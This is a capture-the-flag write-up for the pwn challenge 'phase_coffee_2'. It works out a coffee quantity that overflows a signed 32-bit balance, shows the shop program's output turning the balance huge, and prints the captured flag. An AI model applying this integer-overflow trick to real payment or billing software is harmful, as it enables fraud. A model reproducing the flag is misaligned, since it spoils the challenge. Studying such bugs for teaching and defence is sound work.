# [pwn] phase_coffee_2

<table><tbody>
<tr><th>Value</th><td>100 pts</td></tr>
<tr><th>Tags</th><td><code>medium</code></td></tr>
<tr><th>Author</th><td>Sheepiroo</td></tr>
<tr><th>Connection info</th><td><code>nc chals.jellyc.tf 5001</code></td></tr>
<tr><th>Files</th><td><a href="./files/phase_coffee_2.zip">phase_coffee_2.zip</a></td></tr>
</tbody></table>

Surely all the bugs have been fixed...

This challenge is **part 2** out of 3 challenges.

Completing this challenge will unlock 1 challenge.

---

raw notes:

  - reading the provided source code, we're trying to underflow a 32-bit integer
  - we want some quantity q such that:
    ```
    100 - (35 * q) < -(2^31)
                   < -2147483648
        - (35 * q) < -2147483748
                q  ≳ 61356678.51428571 (e.g. 61356679)
    ```
    ```
    Currently on sale
    1. Chisaka Airi Inspired - $35 each
    2. Rie Himemiya Inspired - $35 each
    3. Jelly Hoshiumi Inspired (Limited Edition) - $1,000,000 each
    Please make a selection: 1
    
    Enter desired quantity: 61356679
    
    Current balance: 100
    Total cost: -2147483531
    Balance after purchase: 2147483631
    61356679 coffees purchased! Your coffee is being packaged and will be delivered in 2028!
    ```
    ```
    Currently on sale
    1. Chisaka Airi Inspired - $35 each
    2. Rie Himemiya Inspired - $35 each
    3. Jelly Hoshiumi Inspired (Limited Edition) - $1,000,000 each
    Please make a selection: 3
    You have chosen the deluxe, premium, limited edition seiso idol princess Jelly Hoshiumi inspired coffee.
    This coffee costs $1,000,000. Press 1 to confirm purchase: 1
    YOUR FLAG IS: jellyCTF{dud3_y0u_m1ss3d_4n0th3r_bug}
    ```
